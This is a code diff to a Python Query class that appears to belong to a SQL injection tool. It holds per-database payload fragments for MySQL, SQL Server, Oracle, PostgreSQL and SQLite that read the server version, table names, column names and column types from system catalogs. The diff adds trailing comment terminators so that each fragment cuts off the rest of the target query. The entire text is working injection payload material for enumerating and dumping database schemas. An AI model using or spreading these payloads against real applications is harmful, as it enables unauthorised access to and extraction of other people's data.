@@ -16,92 +16,92 @@ class Query:
     versions = {
         'MySQL': {
             'select': "@@version",
-            'from': ""
+            'from': "# "
         },
         'Microsoft': {
             'select': "@@version",
-            'from': ""
+            'from': "-- "
         },
         'Oracle': {
             'select': "banner FROM v$version WHERE rownum = 1",
-            'from': ""
+            'from': "-- "
         },
         'PostgreSQL': {
             'select': "version()",
-            'from': ""
+            'from': "-- "
         },
         'SQLite': {
             'select': "sqlite_version()",
-            'from': ""
+            'from': "-- "
         }
     }
 
     tables = {
         'MySQL': {
             'select': "GROUP_CONCAT(table_name SEPARATOR ',')",
-            'from': "FROM information_schema.tables WHERE table_schema=database()"
+            'from': "FROM information_schema.tables WHERE table_schema=database()# "
         },
         'PostgreSQL': {
             'select': "string_agg(table_name,',')",
-            'from': "FROM information_schema.tables WHERE table_schema='public'"
+            'from': "FROM information_schema.tables WHERE table_schema='public'-- "
         },
         'SQLite': {
             'select': "GROUP_CONCAT(name,',')",
-            'from': "FROM sqlite_master WHERE type='table'"
+            'from': "FROM sqlite_master WHERE type='table'-- "
         },
         'Microsoft': {
             'select': "STRING_AGG(table_name,',')",
-            'from': "FROM information_schema.tables"
+            'from': "FROM information_schema.tables-- "
         },
         'Oracle': {
             'select': "LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name)",
-            'from': "FROM user_tables"
+            'from': "FROM user_tables-- "
         },
     }
 
     columns = {
         'MySQL': {
             'select': "GROUP_CONCAT(table_name,0x3a,column_name SEPARATOR ',')",
-            'from': "FROM information_schema.columns WHERE table_schema=database()"
+            'from': "FROM information_schema.columns WHERE table_schema=database()# "
         },
         'PostgreSQL': {
             'select': "string_agg(table_name||':'||column_name,',')",
-            'from': "FROM information_schema.columns WHERE table_schema='public'"
+            'from': "FROM information_schema.columns WHERE table_schema='public'-- "
         },
         'SQLite': {
             'select': "GROUP_CONCAT(name,',')",
-            'from': "FROM pragma_table_info('{}') "
+            'from': "FROM pragma_table_info('{}') -- "
         },
         'Microsoft': {
             'select': "STRING_AGG(table_name+':'+column_name,',')",
-            'from': "FROM information_schema.columns"
+            'from': "FROM information_schema.columns-- "
         },
         'Oracle': {
             'select': "LISTAGG(table_name||':'||column_name,',') WITHIN GROUP (ORDER BY table_name)",
-            'from': "FROM user_tab_columns"
+            'from': "FROM user_tab_columns-- "
         }
     }
 
     dump = {
         'MySQL': {
             'select': "GROUP_CONCAT(table_name,0x3a,column_name,0x3a,column_type SEPARATOR '|')",
-            'from': "FROM information_schema.columns WHERE table_schema=database()"
+            'from': "FROM information_schema.columns WHERE table_schema=database()# "
         },
         'PostgreSQL': {
             'select': "string_agg(table_name||':'||column_name||':'||data_type,'|')",
-            'from': "FROM information_schema.columns WHERE table_schema='public'"
+            'from': "FROM information_schema.columns WHERE table_schema='public'-- "
         },
         'SQLite': {
             'select': "GROUP_CONCAT(name||':'||type,'|')",
-            'from': "FROM pragma_table_info('{}')"
+            'from': "FROM pragma_table_info('{}')-- "
         },
         'Microsoft': {
             'select': "STRING_AGG(table_name+':'+column_name+':'+data_type,'|')",
-            'from': "FROM information_schema.columns"
+            'from': "FROM information_schema.columns-- "
         },
         'Oracle': {
             'select': "LISTAGG(table_name||':'||column_name||':'||data_type,'|') WITHIN GROUP (ORDER BY table_name)",
-            'from': "FROM user_tab_columns"
+            'from': "FROM user_tab_columns-- "
         }
     }
 
